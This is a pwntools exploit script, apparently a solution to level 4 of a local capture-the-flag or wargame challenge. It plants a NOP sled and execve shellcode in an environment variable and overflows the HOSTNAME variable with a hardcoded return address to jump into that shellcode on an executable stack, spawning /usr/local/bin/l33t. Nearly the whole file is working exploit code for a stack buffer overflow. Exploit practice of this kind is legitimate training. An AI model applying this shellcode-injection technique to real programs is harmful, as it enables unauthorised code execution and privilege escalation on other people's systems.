#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./4
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './4AAAAAAA')
exe = context.binary = ELF(args.EXE or '/var/challenge/level4/4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

# Shellcode starts here
shellcode_addr = p64(0x7fffffffee41 + 10) # + 10 to jump over the "L33T=" part of the env variable

# Empty reproducible env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
    "USERNAME": 40 * "A",
    "HOSTNAME": 53 * b"B" + shellcode_addr[:6] # discard the 0 bytes at the end, they give errors and are not copied anyway
}

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env['L33T'] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()
io.interactive()

